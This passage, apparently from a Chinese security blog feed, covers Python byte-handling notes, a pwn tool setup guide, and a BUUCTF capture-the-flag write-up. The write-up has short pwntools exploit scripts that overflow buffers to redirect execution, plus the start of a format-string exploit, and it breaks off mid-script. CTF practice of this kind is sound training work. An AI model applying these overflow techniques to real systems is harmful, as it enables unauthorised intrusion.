href="#to-bytes" class="headerlink" title="to_bytes"></a>to_bytes</h2><p>to_bytes方法的语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">to_bytes(length, byteorder, signed=False)</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>length</code>：生成的字节序列的长度（以字节为单位）。如果整数无法表示为指定长度的字节序列，则会引发<code>OverflowError</code>。</li><li><code>byteorder</code>：指定字节序，可以是<code>&#39;big&#39;</code>（大端序）或<code>&#39;little&#39;</code>（小端序）。</li><li><code>signed</code>（可选）：指示是否使用有符号整数表示。默认为<code>False</code>，表示使用无符号整数。</li></ul><h2 id="int-from-bytes"><a href="#int-from-bytes" class="headerlink" title="int.from_bytes"></a>int.from_bytes</h2><p>与to_bytes相对</p><p><code>int.from_bytes</code>的语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int.from_bytes(bytes, byteorder, signed=False)</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>bytes</code>：要转换的字节序列。</li><li><code>byteorder</code>：指定字节序，可以是<code>&#39;big&#39;</code>（大端序）或<code>&#39;little&#39;</code>（小端序）。</li><li><code>signed</code>（可选）：指示是否使用有符号整数表示。默认为<code>False</code>，表示使用无符号整数。</li></ul><h2 id="bytes构造"><a href="#bytes构造" class="headerlink" title="bytes构造"></a>bytes构造</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">obj=<span class="built_in">bytes</span>(<span class="string">&#x27;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment">#构造字节串</span></span><br><span class="line"><span class="built_in">bytes</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment">#将字节串解码为字符串，使用指定的编码。</span></span><br><span class="line"><span class="built_in">bytes</span>.replace(old, new)</span><br><span class="line"><span class="comment">#替换字节串中的指定子字节串为新的子字节串。</span></span><br><span class="line"><span class="built_in">bytes</span>.split(sep=<span class="literal">None</span>, maxsplit)</span><br><span class="line"><span class="comment">#根据指定的分隔符将字节串拆分为多个子字节串。</span></span><br></pre></td></tr></table></figure><h2 id="strip"><a href="#strip" class="headerlink" title="strip"></a>strip</h2><p>在Python中，<code>strip()</code>是字符串对象的方法之一，用于移除字符串的首尾空白字符（空格、制表符、换行符等）。它返回一个新的字符串，其中移除了原始字符串中的空白字符。</p><p><code>strip()</code>方法的语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string.strip([characters])</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>characters</code>（可选）：指定要移除的字符集合。如果提供了该参数，<code>strip()</code>方法将从字符串的开头和结尾依次移除指定的字符。如果未提供该参数，则默认移除所有的空白字符。</li></ul><h2 id="切片"><a href="#切片" class="headerlink" title="切片[:]"></a>切片[:]</h2><p>切片使用方括号（[]）来表示，其中包含三个部分：起始索引、结束索引和步长。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sequence[start:stop:step]</span><br></pre></td></tr></table></figure><ul><li><code>start</code>：切片的起始索引（包含在切片内）。如果未提供，则默认为0（序列的开头）。</li><li><code>stop</code>：切片的结束索引（不包含在切片内）。如果未提供，则默认为序列的长度。</li><li><code>step</code>：切片的步长（可选）。它指定了每个元素之间的间隔，默认为1。</li></ul><p><strong>obj[::-1]颠倒顺序</strong></p><ol><li>切片索引是基于零的，即第一个元素的索引为0，第二个为1，依此类推。</li><li>如果起始索引超过序列的长度，将返回一个空序列。</li><li>如果结束索引超过序列的长度，切片将一直延伸到序列的末尾。</li><li><strong>切片的步长可以是负数，这将导致从序列的末尾开始向前提取元素。</strong></li><li>生成的切片序列将是原始序列的一部分，并且与原始序列共享相同的元素对象。</li></ol><p>注意切片中<code>-n</code>就代表倒数第<code>n</code>个成员,但<code>n</code>代表第<code>n+1</code>个成员,且奉行左取右不取</p>]]></content>
    
    
    <summary type="html">工欲善其事必先利其器</summary>
    
    
    
    <category term="杂烩" scheme="https://ixout.github.io/categories/%E6%9D%82%E7%83%A9/"/>
    
    
    <category term="基础" scheme="https://ixout.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
    <category term="工具使用" scheme="https://ixout.github.io/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>pwn环境准备</title>
    <link href="https://ixout.github.io/posts/6947/"/>
    <id>https://ixout.github.io/posts/6947/</id>
    <published>2023-03-22T02:29:06.000Z</published>
    <updated>2023-04-15T11:40:05.893Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原本用的虚拟机不知道怎么抽风了，弄了半天没弄好😣，干脆一不做二不休删了重新安装(已经不知道第多少次了),顺便记录下环境搭建过程.因为用惯了ubuntu20所以这次的版本是20.04.04。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="设置超级用户"><a href="#设置超级用户" class="headerlink" title="设置超级用户"></a>设置超级用户</h2><p><code>sudo passwd root</code></p><h2 id="先换个源"><a href="#先换个源" class="headerlink" title="先换个源"></a>先换个源</h2><p>备份一下旧的</p><p><code>sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</code></p><p>编辑</p><p><code>sudo gedit /etc/apt/sources.list</code></p><p>我选择阿里的源,感觉还过得去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 阿里云镜像源</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>这里又踩了个大坑</p><p>得先用<code>lsb_release -c</code>看看自己的ubuntu是哪个版本</p><p>我的是focal之前却用的bionic的源</p><p>就出现了装什么都出错的冥场面</p><h2 id="pip换源"><a href="#pip换源" class="headerlink" title="pip换源"></a>pip换源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/.pip/</span><br><span class="line">vim ~/.pip/pip.conf</span><br></pre></td></tr></table></figure><p>内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">trusted-host = pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure><h2 id="安装vim"><a href="#安装vim" class="headerlink" title="安装vim"></a>安装vim</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install vim</span><br></pre></td></tr></table></figure><h2 id="安装gcc"><a href="#安装gcc" class="headerlink" title="安装gcc"></a>安装gcc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc</span><br><span class="line">gcc --version  </span><br></pre></td></tr></table></figure><h2 id="配置32位环境"><a href="#配置32位环境" class="headerlink" title="配置32位环境"></a>配置32位环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt install build-essential</span><br><span class="line">sudo apt install gcc-multilib</span><br></pre></td></tr></table></figure><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure><h2 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h2><p>两种方法</p><p>第一种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">sudo python3 -m pip install --upgrade pip</span><br><span class="line">sudo python3 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><p>第二种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Gallopsled/pwntools</span><br><span class="line">cd pwntools</span><br><span class="line">sudo python setup.py install #这一步最好挂魔法</span><br></pre></td></tr></table></figure><h2 id="安装capstone"><a href="#安装capstone" class="headerlink" title="安装capstone"></a>安装capstone</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/aquynh/capstone</span><br><span class="line">cd capstone</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="pwndbg与pwngdb"><a href="#pwndbg与pwngdb" class="headerlink" title="pwndbg与pwngdb"></a>pwndbg与pwngdb</h2><p>pwngdb</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~/</span><br><span class="line">git clone https://github.com/scwuaptx/Pwngdb.git </span><br><span class="line">cp ~/Pwngdb/.gdbinit ~/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">功能</span><br><span class="line">libc : Print the base address of libc</span><br><span class="line">ld : Print the base address of ld</span><br><span class="line">codebase : Print the base of code segment</span><br><span class="line">heap : Print the base of heap</span><br><span class="line">got : Print the Global Offset Table infomation</span><br><span class="line">dyn : Print the Dynamic section infomation</span><br><span class="line">findcall : Find some function call</span><br><span class="line">bcall : Set the breakpoint at some function call</span><br><span class="line">tls : Print the thread local storage address</span><br><span class="line">at : Attach by process name</span><br><span class="line">findsyscall : Find the syscall</span><br><span class="line">fmtarg : Calculate the index of format string</span><br><span class="line">You need to stop on printf which has vulnerability.</span><br><span class="line">force : Calculate the nb in the house of force.</span><br><span class="line">heapinfo : Print some infomation of heap</span><br><span class="line">heapinfo (Address of arena)</span><br><span class="line">default is the arena of current thread</span><br><span class="line">If tcache is enable, it would show infomation of tcache entry</span><br><span class="line">heapinfoall : Print some infomation of heap (all threads)</span><br><span class="line">arenainfo : Print some infomation of all arena</span><br><span class="line">chunkinfo: Print the infomation of chunk</span><br><span class="line">chunkinfo (Address of victim)</span><br><span class="line">chunkptr : Print the infomation of chunk</span><br><span class="line">chunkptr (Address of user ptr)</span><br><span class="line">mergeinfo : Print the infomation of merge</span><br><span class="line">mergeinfo (Address of victim)</span><br><span class="line">printfastbin : Print some infomation of fastbin</span><br><span class="line">tracemalloc on : Trace the malloc and free and detect some error .</span><br><span class="line">You need to run the process first than tracemalloc on, it will record all of the malloc and free.</span><br><span class="line">You can set the DEBUG in pwngdb.py , than it will print all of the malloc and free infomation such as the screeshot.</span><br><span class="line">parseheap : Parse heap layout</span><br><span class="line">magic : Print useful variable and function in glibc</span><br><span class="line">fp : show FILE structure</span><br><span class="line">fp (Address of FILE)</span><br><span class="line">fpchain: show linked list of FILE</span><br><span class="line">orange : Test house of orange condition in the _IO_flush_lockp</span><br><span class="line">orange (Address of FILE)</span><br><span class="line">glibc version &lt;= 2.23</span><br></pre></td></tr></table></figure><p>pwndbg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh#建议挂魔法</span><br></pre></td></tr></table></figure><p>联合使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gedit ~/.gdbinit</span><br><span class="line">注释掉第一行 然后在第二行写入</span><br><span class="line">source ~/pwndbg/gdbinit.py</span><br></pre></td></tr></table></figure><h2 id="安装seccomp-tools"><a href="#安装seccomp-tools" class="headerlink" title="安装seccomp-tools"></a>安装seccomp-tools</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">gem install seccomp-tools</span><br></pre></td></tr></table></figure><h2 id="安装one-gadget"><a href="#安装one-gadget" class="headerlink" title="安装one_gadget"></a>安装one_gadget</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure><h2 id="安装LibcSearcher"><a href="#安装LibcSearcher" class="headerlink" title="安装LibcSearcher"></a>安装LibcSearcher</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install LibcSearcher</span><br><span class="line">sudo pip3 install -U LibcSearcher</span><br></pre></td></tr></table></figure><h2 id="安装main-arena-offset"><a href="#安装main-arena-offset" class="headerlink" title="安装main_arena_offset"></a>安装main_arena_offset</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/dev2ero/py_main_arena_offset.git</span><br><span class="line">cd py_main_arena_offset</span><br><span class="line">sudo python3 setup.py develop</span><br></pre></td></tr></table></figure><p>用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pymao import *</span><br><span class="line"></span><br><span class="line">libc = &quot;./libc.so.6&quot;</span><br><span class="line">main_arena_offset = gmao( libc )</span><br><span class="line">print(hex(main_arena_offset))</span><br></pre></td></tr></table></figure><h2 id="安装本地调试不同版本的libc环境"><a href="#安装本地调试不同版本的libc环境" class="headerlink" title="安装本地调试不同版本的libc环境"></a>安装本地调试不同版本的libc环境</h2><p><strong>glibc-all-in-one</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class="line">cd glibc-all-in-one</span><br><span class="line">python3 update_list</span><br><span class="line">cat list</span><br><span class="line"> ./download [libc-version]</span><br></pre></td></tr></table></figure><p><strong>patchelf</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/NixOS/patchelf.git</span><br><span class="line">cd patchelf</span><br><span class="line">sudo apt-get install autoconf automake libtool</span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 [your-libc-path] [yourelf]</span><br><span class="line">patchelf --set-interpreter [libc-ld-path] [elf]</span><br><span class="line">cp -r ~/Desktop/glibc-all-in-one/libs/[libcfolderpath]/.debug/ ./debug</span><br><span class="line">gdb [elf]</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>只能说做pwn就是要遇到各种奇奇怪怪的问题</p>]]></content>
    
    
    <summary type="html">准备</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="环境搭建" scheme="https://ixout.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>buuctf刷题记录-1</title>
    <link href="https://ixout.github.io/posts/13868/"/>
    <id>https://ixout.github.io/posts/13868/</id>
    <published>2023-03-21T13:53:30.000Z</published>
    <updated>2023-06-01T09:50:39.064Z</updated>
    
    <content type="html"><![CDATA[<h1 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h1><p>题如其名</p><h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><p>入门题，防护全关</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets(s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote() <span class="comment">#不固定就不写了</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">23</span>+p64(<span class="number">0x40118a</span>)) <span class="comment">#其实都比较建议跳过开头的开辟栈帧操作,要不然总是遇到一些奇奇怪怪的问题①</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>吃的大亏,现在才知道<strong>有些题目虽然有输出信息,但远程recv()是收不到东西会卡住的</strong></p><details class="folding-tag" yellow><summary> ① </summary>              <div class='content'>              <p>在一些比较新的环境下,如果覆盖返回地址的开头的操作为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push rbp</span><br><span class="line">mov rbp,rsp</span><br></pre></td></tr></table></figure><p>程序就会崩溃</p><p>至于原因,就是调用system时,栈没有对齐,如果不push rbp则对齐,故选择跳过</p><p>因此视情况跳过这两句代码</p>              </div>            </details><h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p>和上一题基本没有区别</p><p>只不过最后不是给shell权限而是直接cat flag罢了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span>+p64(<span class="number">0x40060d</span>))</span><br><span class="line">p.interactive() <span class="comment">#虽然不是拿到shell但回到shell模式也能直接获得输出</span></span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><p>保护只开了nx</p><p>ida查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个思路</p><ol><li>直接溢出返回地址到cat /flag指令处</li><li>溢出修改v2,这个比较值是字面值可以在.rodata中找到</li></ol><p><strong>exp1</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28933</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p64(<span class="number">0x4006BE</span>)) <span class="comment">#一开始好几次没成功,以为不行,结果是我打包成p32了</span></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>exp2</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span></span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">44</span>+p32(<span class="number">0x41348000</span>))<span class="comment">#这里就要p32了float是四字节,其实p64也行只不过会覆盖到返回地址</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><p>保护只开nx</p><p>ida查看</p><p>发现是c++代码,我这半桶水读起来有点吃力</p><p>直接运行看看,发现输入I会被替换为you,这样一个I能填充三个字节就可以做到溢出的效果了</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x08048F10</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>读一读源码</p><ol><li><p>fgets(s, 32, edata) ,edata其实也就是stdin了</p></li><li><p>使用 <code>std::string::operator=</code> 将 <code>s</code> 中的内容赋值给名为 <code>input</code> 的 <code>std::string</code> 对象。</p></li><li>使用 <code>std::allocator&lt;char&gt;::allocator</code> 创建了一个 <code>std::allocator&lt;char&gt;</code> 对象，并将其地址传递给 <code>v5</code> 变量。</li><li>使用 <code>std::string::string</code> 构造了一个 <code>std::string</code> 对象 <code>v4</code>，其中包含字符串 “you”。</li><li>使用 <code>std::allocator&lt;char&gt;::allocator</code> 创建了另一个 <code>std::allocator&lt;char&gt;</code> 对象，并将其地址传递给 <code>v7</code> 变量。</li><li>使用 <code>std::string::string</code> 构造了另一个 <code>std::string</code> 对象 <code>v6</code>，其中包含字符串 “I”。</li><li>调用 <code>replace()</code> 函数，将 <code>input</code> 对象中的子字符串 “I” 替换为字符串 “you”.</li><li>使用 <code>std::string::operator=</code> 将 <code>v3</code> 变量中的字符串内容赋值给 <code>input</code> 对象，并在 <code>v6</code> 和 <code>v4</code> 的帮助下构造了一个新的字符串。</li><li>调用 <code>std::string</code> 和 <code>std::allocator</code> 的析构函数来释放已分配的内存。</li><li>将 <code>input</code> 中的字符串复制到 <code>s</code> 变量中。</li><li>使用 <code>printf()</code> 函数打印最终结果</li></ol><h1 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h1><p>没什么好说的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0x40059A</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h1><p>保护查一查，开启了nx与canary</p><p>ida看一看，确定为格式化字符串漏洞</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-24_210019.png" alt=""></p><p>第一想法是dword_804c044有出现在参数中,那么栈中能找到能找到它,可以泄露其中的数据,再输入以通过</p><p>不过gdb调试发现read后的栈中它的地址已经被覆盖了,</p><p>那就只能选择任意地址写了</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-24_210719.png" alt=""></p><p><strong>格式化字符串是第一个参数</strong>,那么输入内容的相对偏移是10</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span 